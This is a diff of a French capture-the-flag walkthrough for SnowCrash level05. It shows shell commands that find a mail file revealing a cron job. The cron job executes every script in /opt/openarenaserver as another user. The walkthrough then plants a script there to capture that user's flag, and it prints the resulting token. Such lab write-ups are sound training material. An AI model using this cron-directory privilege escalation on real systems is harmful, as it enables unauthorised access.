@@ -2,11 +2,19 @@
 
 </br></br>
 
-## vérifier e-mail
+## vérifier fichier
 
-```zsh
-level05@SnowCrash:~$ ls /var/mail
-level05
+```sh
+level05@SnowCrash:~$ find / -name "level05" 2>/dev/null
+/var/mail/level05
+/rofs/var/mail/level05
+```
+
+</br></br>
+
+## vérifier mail
+
+```sh
 level05@SnowCrash:~$ cat /var/mail/level05
 */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
 ```
@@ -35,15 +43,31 @@ Ce script exécute de manière récursive tous les fichiers du répertoire /opt/
 
 ## Créer un exécutable getflag dans /opt/openarenaserver
 
+On peut pas créer /tmp/level05/flag05 avec redirection!
+
 ```sh
 level05@SnowCrash:~$ mkdir /tmp/level05
+level05@SnowCrash:~$ ls -ld /tmp/level05
+drwxrwxr-x 2 level05 level05 40 Aug 28 23:03 /tmp/level05
+```
+
+Seul "level05" a le droit de créer des fichiers dans ce dossier
+
+```sh
+level05@SnowCrash:~$ ls -ld /tmp
+d-wx-wx-wx 5 root root 120 Aug 28 23:16 /tmp
+```
+
+donc, on peut le faire la redirection à /tmp
+
+```sh
 level05@SnowCrash:~$ vim /opt/openarenaserver/getflag.sh
 #!/bin/bash
 /bin/getflag > /tmp/flag05
 level05@SnowCrash:~$ chmod +x /opt/openarenaserver/getflag.sh
 ```
 
-```zsh
+```sh
 level05@SnowCrash:/tmp/level05$ cat /tmp/flag05
 Check flag.Here is your token : viuaaale9huek52boumoomioc
 level05@SnowCrash:/tmp/level05$ su level06
